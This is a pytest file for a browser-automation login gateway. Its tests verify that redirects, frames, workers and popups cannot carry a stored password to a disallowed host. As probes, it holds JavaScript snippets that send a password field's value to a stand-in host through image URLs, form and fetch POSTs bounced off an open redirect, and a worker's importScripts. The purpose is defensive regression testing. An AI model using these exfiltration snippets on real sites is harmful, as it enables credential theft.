"""A host that served an asset is *armed* at the proxy, and the proxy cannot tell a document from an
image. Playwright's `route` never sees the hops of a redirect. So a server redirect (or an open
redirect on an allowed host) can put a document, an XHR or a POST onto an armed host without any
gate seeing it (security.md §4.4). These tests are the review's probes, made permanent:

* a document that way is not a page of the connection: no value is typed into it, no step is taken
  on it, its requests are refused, and the student is asked about its host like for any redirect;
* an XHR or a 307 POST that way stops the flow of the connection the same way. (The request is
  already on its way when the hop is seen: what is guaranteed is that nothing goes on after it.)
"""

# ruff: noqa: F811
from __future__ import annotations

import asyncio
from collections.abc import Awaitable, Callable
from typing import Any
from urllib.parse import quote

import pytest

from botai.browser.gateway import PlaywrightGateway, PlaywrightHandle
from botai.core.errors import BotaiError, ErrorCode
from botai.core.vault import SecretKind
from tests.browser.test_assets import (  # noqa: F401 - fixtures
    Opener,
    fresh_stand,
    gate,
    load_script,
    open_browser,
)
from tests.browser.test_login import (
    ORIGIN,
    Rig,
    Student,
    make_rig,  # noqa: F401 - fixture
    preset_dict,
    works,
)
from tests.fakeuni import data
from tests.fakeuni.login import ASSET_HOST, ASSETS

pytestmark = pytest.mark.browser

IDP = "id.fakeuni.test"
PASSWORD = "vault-password-fixture"


async def arm(handle: PlaywrightHandle, host: str) -> None:
    """Make `host` an armed asset host of the context, the way any page script can."""
    assert await load_script(handle, f"https://{host}/assets/arm.js") == "loaded"
    assert host in gate(handle).hosts


async def tainted(handle: PlaywrightHandle) -> BotaiError:
    """The error the handle gives once a foreign document or request was met (waits for it)."""
    for _ in range(100):
        if handle._tainted is not None:  # pyright: ignore[reportPrivateUsage]
            break
        await asyncio.sleep(0.05)
    with pytest.raises(BotaiError) as exc:
        await handle.snapshot()
    return exc.value


# ----------------------------------------------------------------------- a document, by redirect


async def test_a_server_redirect_to_an_armed_host_is_not_a_page_of_the_connection(
    open_browser: Opener,
) -> None:
    handle = await open_browser()
    await handle.goto(f"{ORIGIN}/assets/data")
    await arm(handle, IDP)

    with pytest.raises(BotaiError) as exc:  # /sso/start answers 302 to https://id.fakeuni.test/…
        await handle.goto(f"{ORIGIN}/sso/start")
    assert exc.value.code == ErrorCode.EGRESS_BLOCKED
    assert exc.value.extra == {"host": IDP}  # LoginFlow puts this host to the student
    failure = handle.navigation_failure()
    assert failure is not None
    assert failure.extra == {"host": IDP}

    # the flow is stopped for good: nothing is read from it, typed into it or clicked on it
    for action in (
        handle.snapshot(),
        handle.fill("#pw", PASSWORD),
        handle.click("button"),
        handle.press("#pw", "Enter"),
        handle.goto(f"{ORIGIN}/auth/login"),
        handle.export_session(),
    ):
        with pytest.raises(BotaiError) as stopped:
            await action
        assert stopped.value.code == ErrorCode.EGRESS_BLOCKED
        assert stopped.value.extra == {"host": IDP}
    assert IDP not in handle.visited_hosts()  # and the host is not learned as a login host
    assert handle.allow_hosts == ("fakeuni.test",)

    # the page is taken off the document
    for _ in range(100):
        if handle.page.url == "about:blank":
            break
        await asyncio.sleep(0.05)
    assert handle.page.url == "about:blank"


async def test_what_a_foreign_document_asks_for_is_refused_by_the_gate_alone(
    open_browser: Opener, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The probe of the review: the form on the armed host is filled and the value leaves as an
    image address. With the quarantine switched off, the gate alone must hold."""

    async def stay(_self: PlaywrightHandle) -> None:
        return None

    async def stay_there(_page: Any) -> None:
        return None

    monkeypatch.setattr(PlaywrightHandle, "_quarantine", stay)
    monkeypatch.setattr(PlaywrightHandle, "_blank", staticmethod(stay_there))
    monkeypatch.setattr(PlaywrightHandle, "_lock_down", stay)  # the gate alone, then
    handle = await open_browser()
    await handle.goto(f"{ORIGIN}/assets/data")
    await arm(handle, IDP)
    with pytest.raises(BotaiError):
        await handle.goto(f"{ORIGIN}/sso/start")
    assert handle.page.url.startswith(f"https://{IDP}/sso/login")  # still there

    await handle.page.fill("#pw", PASSWORD)  # (the page itself, not the handle)
    sent = await handle.page.evaluate(
        """(host) => new Promise((resolve) => {
            const image = new Image();
            image.onload = () => resolve('sent');
            image.onerror = () => resolve('refused');
            image.src = 'https://' + host + '/assets/x.png?p=' + document.getElementById('pw').value;
        })""",
        IDP,
    )
    assert sent == "refused"
    assert not [r for r in ASSETS.to(IDP) if r["path"] == "/assets/x.png"]
    assert gate(handle).counts["asset_frame"] >= 1


async def test_a_foreign_document_in_a_frame_stops_the_flow_and_cannot_ask_for_anything(
    open_browser: Opener,
) -> None:
    handle = await open_browser()
    await handle.goto(f"{ORIGIN}/assets/data")
    await arm(handle, IDP)
    await handle.page.evaluate(
        "() => { const f = document.createElement('iframe'); f.src = '/sso/start'; "
        "document.body.append(f); }"
    )
    error = await tainted(handle)
    assert error.code == ErrorCode.EGRESS_BLOCKED
    assert error.extra == {"host": IDP}
    with pytest.raises(BotaiError):
        await handle.fill("#anything", PASSWORD)


# ----------------------------------------------------------- an XHR or a POST, by open redirect


@pytest.mark.parametrize(("method", "code"), [("GET", 302), ("POST", 307)])
async def test_a_request_of_the_page_sent_on_to_an_armed_host_by_an_open_redirect_stops_the_flow(
    open_browser: Opener, method: str, code: int
) -> None:
    """`fetch('/redirect/open?to=…')` leaves for an allowed host; the host answers 302/307 to an
    armed one. The gate never sees the second hop, the handle does (the `request` event)."""
    handle = await open_browser()
    await handle.goto(f"{ORIGIN}/assets/data")
    await arm(handle, ASSET_HOST)
    target = quote(f"https://{ASSET_HOST}/assets/data", safe="")
    await handle.page.evaluate(  # (not awaited in the page: the flow is stopped under its feet)
        """([url, method]) => { fetch(url, {
              method, body: method === 'POST' ? 'vault-password-fixture' : undefined,
              mode: 'no-cors',
           }).catch(() => {}); }""",
        [f"/redirect/open?to={target}&code={code}", method],
    )
    error = await tainted(handle)
    assert error.code == ErrorCode.EGRESS_BLOCKED
    expected: dict[str, Any] = {"host": ASSET_HOST}
    if method == "POST":
        expected["post"] = True  # «Сайт вуза отправляет данные … на …»
    assert error.extra == expected
    assert gate(handle).counts["asset_redirect"] == 1
    with pytest.raises(BotaiError) as stopped:
        await handle.fill("#anything", PASSWORD)
    assert stopped.value.extra == expected
    assert ASSET_HOST not in handle.visited_hosts()


async def test_an_asset_that_a_redirect_sends_to_an_armed_host_is_not_an_alarm(
    open_browser: Opener,
) -> None:
    """A CDN that answers an image with a 302 to its other host is what an asset may do."""
    handle = await open_browser()
    await handle.goto(f"{ORIGIN}/assets/data")
    await arm(handle, ASSET_HOST)
    target = quote(f"https://{ASSET_HOST}/assets/pixel.png", safe="")
    loaded = await handle.page.evaluate(
        """(url) => new Promise((resolve) => {
            const image = new Image();
            image.onload = () => resolve('loaded');
            image.onerror = () => resolve('failed');
            image.src = url;
        })""",
        f"/redirect/open?to={target}&code=302",
    )
    assert loaded == "loaded"
    await handle.snapshot()  # still the connection's page
    assert gate(handle).counts["asset_redirect"] == 0


# ------------------------------------------------------------------------- the login flow


def sso_flow(
    gateway: PlaywrightGateway, monkeypatch: pytest.MonkeyPatch
) -> tuple[list[str], list[PlaywrightHandle]]:
    """Every handle the flow opens first has the identity host armed (a page script did that), and
    every `fill` it makes is written down."""
    filled: list[str] = []
    handles: list[PlaywrightHandle] = []
    original: Callable[..., Awaitable[PlaywrightHandle]] = gateway.open

    async def arming_open(**kwargs: Any) -> PlaywrightHandle:
        handle = await original(**kwargs)
        handles.append(handle)
        await load_script(handle, f"https://{IDP}/assets/arm.js")  # a no-op if IDP is allowed
        return handle

    real_fill = PlaywrightHandle.fill

    async def spy(self: PlaywrightHandle, selector: str, value: str) -> None:
        filled.append(selector)
        await real_fill(self, selector, value)

    monkeypatch.setattr(gateway, "open", arming_open)
    monkeypatch.setattr(PlaywrightHandle, "fill", spy)
    return filled, handles


async def test_the_flow_types_nothing_into_the_page_of_an_armed_host_and_asks_the_student(
    make_rig: Callable[..., Rig],
    gateway: PlaywrightGateway,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    filled, _ = sso_flow(gateway, monkeypatch)
    rig = make_rig()
    rig.store.seed_preset(ORIGIN, preset_dict(f"{ORIGIN}/sso/start"))
    await rig.vault.put(rig.user, rig.conn, SecretKind.LOGIN, data.USERNAME)
    await rig.vault.put(rig.user, rig.conn, SecretKind.PASSWORD, PASSWORD)
    student = Student(approve_hosts=False)

    with pytest.raises(BotaiError) as exc:
        await rig.ensure(student)

    assert exc.value.code == ErrorCode.EGRESS_BLOCKED
    assert exc.value.extra == {"host": IDP}
    (question,) = student.confirmations
    assert IDP in question
    assert filled == []  # the password of the Vault was never typed
    assert not [r for r in ASSETS.to(IDP) if "p=" in str(r["query"])]
    assert student.asked == []  # nor asked for a value of the page


async def test_when_the_student_allows_the_host_the_login_goes_on_there(
    make_rig: Callable[..., Rig],
    gateway: PlaywrightGateway,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    filled, _ = sso_flow(gateway, monkeypatch)
    rig = make_rig()
    rig.store.seed_preset(ORIGIN, preset_dict(f"{ORIGIN}/sso/start"))
    await rig.vault.put(rig.user, rig.conn, SecretKind.LOGIN, data.USERNAME)
    await rig.vault.put(rig.user, rig.conn, SecretKind.PASSWORD, data.PASSWORD)
    student = Student(approve_hosts=True)

    session, _ctx = await rig.ensure(student)

    assert await works(session)
    assert len(student.confirmations) == 1
    assert IDP in rig.store.connections[(rig.user, rig.conn)].allow_hosts
    assert filled  # typed, on the host the student allowed
    assert session.asset_hosts == []  # an allowed host is a login host, not an asset


# ------------------------------------------------- a foreign document that is still on its page
#
# The quarantine takes the page to about:blank, but a document that is quicker (or a flow that
# is not yet told) must not be able to send anything meanwhile: the first taint shuts the context.
# These tests keep the document on its page (the quarantine is switched off) to prove it.


@pytest.fixture
def stays_on_the_page(monkeypatch: pytest.MonkeyPatch) -> None:
    async def stay(_self: PlaywrightHandle) -> None:
        return None

    async def stay_there(_page: Any) -> None:
        return None

    monkeypatch.setattr(PlaywrightHandle, "_quarantine", stay)
    monkeypatch.setattr(PlaywrightHandle, "_blank", staticmethod(stay_there))


async def foreign_page(open_browser: Opener) -> PlaywrightHandle:
    """A handle whose page is a document of the armed identity host, and which has been told."""
    handle = await open_browser()
    await handle.goto(f"{ORIGIN}/assets/data")
    await arm(handle, IDP)
    with pytest.raises(BotaiError):
        await handle.goto(f"{ORIGIN}/sso/start")
    assert handle.page.url.startswith(f"https://{IDP}/sso/login")  # still there
    return handle


def leaks(host: str = IDP) -> list[dict[str, str | None]]:
    return [r for r in ASSETS.to(host) if PASSWORD in str(r["query"]) or PASSWORD in str(r["body"])]


BOUNCE_VIA_IMAGE = """(pw) => new Promise((resolve) => {
    const image = new Image();
    image.onload = () => resolve('sent');
    image.onerror = () => resolve('refused');
    image.src = 'https://fakeuni.test/redirect/open?to=' + encodeURIComponent(
      'https://id.fakeuni.test/assets/x.png?p=' + pw);
})"""

BOUNCE_VIA_FORM = """(pw) => {
    const form = document.createElement('form');
    form.method = 'post';
    form.action = 'https://fakeuni.test/redirect/open?code=307&to=' + encodeURIComponent(
      'https://id.fakeuni.test/assets/data?p=' + pw);
    const field = document.createElement('input');
    field.name = 'p'; field.value = pw;
    form.append(field);
    document.body.append(form);
    form.submit();
}"""

BOUNCE_VIA_FETCH = """(pw) => fetch('https://fakeuni.test/redirect/open?code=307&to=' + encodeURIComponent(
      'https://id.fakeuni.test/assets/data'), {method: 'POST', body: pw, mode: 'no-cors'})
    .then(() => 'sent', () => 'refused')"""


@pytest.mark.parametrize("how", ["image", "form", "fetch"])
async def test_a_foreign_document_cannot_bounce_a_value_through_an_open_redirect_of_an_allowed_host(
    open_browser: Opener, stays_on_the_page: None, how: str
) -> None:
    """The first hop goes to an allowed host (the asset gate does not look at those), the redirect
    sends the value on to the armed host. With the context shut, nothing leaves."""
    handle = await foreign_page(open_browser)
    await handle.page.fill("#pw", PASSWORD)
    script = {"image": BOUNCE_VIA_IMAGE, "form": BOUNCE_VIA_FORM, "fetch": BOUNCE_VIA_FETCH}[how]
    outcome = await handle.page.evaluate(script, PASSWORD)
    await asyncio.sleep(0.6)
    assert outcome in {None, "refused"}  # (a form submission has no answer: the page is left)
    assert leaks() == []


async def test_without_the_lockdown_the_same_bounce_leaks(
    open_browser: Opener, stays_on_the_page: None, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The control of the tests above: what the review found. Only the lockdown stops it."""

    async def open_context(_self: PlaywrightHandle) -> None:
        return None

    monkeypatch.setattr(PlaywrightHandle, "_lock_down", open_context)
    handle = await foreign_page(open_browser)
    await handle.page.fill("#pw", PASSWORD)
    await handle.page.evaluate(BOUNCE_VIA_IMAGE, PASSWORD)
    for _ in range(60):
        if leaks():
            break
        await asyncio.sleep(0.05)
    assert leaks(), "the probe no longer reaches the server: the tests above prove nothing"


async def test_a_worker_of_a_foreign_document_cannot_send_either(
    open_browser: Opener, stays_on_the_page: None
) -> None:
    """A dedicated worker has no frame, so the asset gate cannot tell whose it is."""
    handle = await foreign_page(open_browser)
    await handle.page.fill("#pw", PASSWORD)
    await handle.page.evaluate(
        """(pw) => new Promise((resolve) => {
            const code = "try { importScripts('https://id.fakeuni.test/assets/x.png?p=" + pw +
                         "'); } catch (e) {} postMessage('done');";
            const worker = new Worker(URL.createObjectURL(new Blob([code])));
            worker.onmessage = () => resolve('done');
            setTimeout(() => resolve('timeout'), 3000);
        })""",
        PASSWORD,
    )
    await asyncio.sleep(0.3)
    assert leaks() == []


async def test_a_window_opened_after_the_flow_was_stopped_is_not_adopted_and_does_not_load(
    open_browser: Opener, stays_on_the_page: None
) -> None:
    handle = await foreign_page(open_browser)
    original = handle.page
    opened: list[Any] = []
    handle.context.on("page", lambda page: opened.append(page))
    await handle.page.evaluate("() => { window.open('https://fakeuni.test/sso/start'); }")
    for _ in range(100):
        if opened and opened[0].is_closed():
            break
        await asyncio.sleep(0.05)
    assert opened, "the window never opened"
    assert opened[0].is_closed()  # discarded
    assert handle.page is original  # the remote screen keeps the page it had


async def test_a_window_opened_before_the_taint_is_taken_off_the_document_too(
    open_browser: Opener,
) -> None:
    handle = await open_browser()
    await handle.goto(f"{ORIGIN}/assets/data")
    await arm(handle, IDP)
    await handle.page.evaluate("() => { window.open('/sso/start'); }")
    error = await tainted(handle)
    assert error.extra == {"host": IDP}
    for _ in range(100):
        if all(
            page.url in {"about:blank", ""} or page.is_closed() for page in handle.context.pages
        ):
            break
        await asyncio.sleep(0.05)
    assert all(page.url in {"about:blank", ""} or page.is_closed() for page in handle.context.pages)


# ------------------------------------------------------------------ what a stopped flow is told


async def test_an_action_that_fails_after_the_taint_reports_the_host_not_a_missing_field(
    open_browser: Opener, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr("botai.browser.gateway.ACTION_TIMEOUT_MS", 800)
    handle = await open_browser()
    await handle.goto(f"{ORIGIN}/assets/data")
    await arm(handle, IDP)
    await handle.page.evaluate("() => setTimeout(() => { location = '/sso/start'; }, 100)")
    for action in (
        handle.click("#never-there"),
        handle.press("#never-there", "Enter"),
        handle.fill("#never-there", PASSWORD),
    ):
        with pytest.raises(BotaiError) as exc:
            await action
        assert exc.value.code == ErrorCode.EGRESS_BLOCKED, exc.value.detail
        assert exc.value.extra == {"host": IDP}


async def test_fill_never_types_into_a_document_that_arrived_while_it_waited_for_its_field(
    open_browser: Opener, stays_on_the_page: None
) -> None:
    """The review's race: `#pw` exists only on the identity host's page, which the connection's
    page navigates to 300 ms later. A fill by selector would wait, find it there and type."""
    handle = await open_browser()
    await handle.goto(f"{ORIGIN}/assets/data")
    await arm(handle, IDP)
    await handle.page.evaluate("() => setTimeout(() => { location = '/sso/start'; }, 300)")
    with pytest.raises(BotaiError) as exc:
        await handle.fill("#pw", PASSWORD)
    assert exc.value.code == ErrorCode.EGRESS_BLOCKED
    assert exc.value.extra == {"host": IDP}
    assert await handle.page.input_value("#pw") == ""  # nothing was typed
